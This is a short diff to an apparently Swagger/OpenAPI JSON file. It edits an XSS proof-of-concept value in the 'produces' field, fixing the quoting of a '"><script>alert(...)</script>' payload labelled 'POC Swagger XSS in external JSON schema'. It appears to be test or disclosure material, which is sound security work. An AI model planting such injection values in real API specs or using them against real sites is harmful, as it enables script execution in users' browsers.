@@ -10,7 +10,7 @@
         "operationId": "listVersionsv2",
         "summary": "List API versions",
         "produces": [
-          "\"><script>alert("POC Swagger XSS in external JSON schema")</script>"
+          "\"><script>alert('POC Swagger XSS in external JSON schema')</script>"
         ],
         "responses": {
           "200": {
